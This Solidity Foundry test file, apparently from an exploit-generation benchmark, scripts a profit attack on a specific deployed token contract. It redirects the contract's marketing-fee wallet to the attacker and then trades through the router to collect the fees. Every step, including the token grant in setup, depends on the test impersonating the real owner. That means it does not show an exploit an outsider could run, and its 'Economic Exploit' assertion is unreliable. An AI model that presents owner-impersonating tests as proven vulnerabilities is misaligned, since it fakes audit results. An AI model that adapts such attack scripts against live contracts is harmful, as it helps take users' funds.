// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface MemeFarm {
    function owner() external view returns (address);
    function ________() external view returns (address payable);
    function uniswapPair() external view returns (address);
    function uniswapV2Router() external view returns (IUniswapV2Router02);
    function setMarketinWalleAddress(address newAddress) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function swapAndLiquifyEnabled() external view returns (bool);
    function swapAndLiquifyByLimitOnly() external view returns (bool);
    function minimumTokensBeforeSwapAmount() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x8fAc119886DD328a84Cd545881C7A484017E7Ce6;
    address attacker = address(this);
    IUniswapV2Router02 router;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // First, we need to find the current owner
        address owner = MemeFarm(TARGET).owner();
        vm.label(owner, "Contract Owner");

        // Label the contract for debugging
        vm.label(TARGET, "MemeFarm Contract");

        // Get the uniswap pair address for trading
        address uniswapPair = MemeFarm(TARGET).uniswapPair();
        vm.label(uniswapPair, "Uniswap Pair");

        // Get the router address
        router = MemeFarm(TARGET).uniswapV2Router();
        vm.label(address(router), "Pancake Router");

        // Give attacker some initial BNB for trading
        deal(attacker, 100 ether);

        // Give attacker some tokens to start with (we'll need to get them from somewhere)
        // The owner has all tokens initially, so we need to impersonate owner to transfer some
        vm.startPrank(owner);
        MemeFarm(TARGET).transfer(attacker, 1000000000 * 10**9);
        vm.stopPrank();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Step 1: Impersonate owner and set marketing wallet to attacker
        address owner = MemeFarm(TARGET).owner();
        vm.startPrank(owner);
        MemeFarm(TARGET).setMarketinWalleAddress(attacker);
        vm.stopPrank();

        // Verify marketing wallet was set to attacker
        address marketingWallet = MemeFarm(TARGET).________();
        require(marketingWallet == attacker, "Marketing wallet not set to attacker");

        // Step 2: Generate fee accumulation by making a trade
        // First, approve router to spend attacker's tokens
        vm.prank(attacker);
        MemeFarm(TARGET).approve(address(router), type(uint256).max);

        // Get WETH address for trading path
        address weth = router.WETH();

        // Buy some tokens to generate buy fees
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = TARGET;

        uint256 amountIn = 1 ether;

        // Record initial BNB balance of contract
        uint256 initialContractBalance = address(TARGET).balance;

        // Make the swap (buy tokens with BNB)
        vm.prank(attacker);
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amountIn}(
            0,
            path,
            attacker,
            block.timestamp
        );

        // Step 3: Sell tokens to trigger swapAndLiquify
        // Get token balance after buy
        uint256 tokenBalance = MemeFarm(TARGET).balanceOf(attacker);

        // Set up sell path
        address[] memory sellPath = new address[](2);
        sellPath[0] = TARGET;
        sellPath[1] = weth;

        // Record attacker's BNB balance before sell
        uint256 attackerBalanceBefore = attacker.balance;

        // Sell half of tokens to trigger fee collection
        vm.prank(attacker);
        MemeFarm(TARGET).approve(address(router), tokenBalance / 2);

        vm.prank(attacker);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenBalance / 2,
            0,
            sellPath,
            attacker,
            block.timestamp
        );

        // Step 4: Check if marketing fees were collected
        // The contract should have accumulated fees and triggered swapAndLiquify
        // Marketing fees should have been sent to attacker's address
        uint256 attackerBalanceAfter = attacker.balance;

        // The oracle will check if attacker balance increased
        // We need to ensure we have more BNB than before
        assertGt(attackerBalanceAfter, attackerBalanceBefore, "Attacker BNB balance should increase");
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

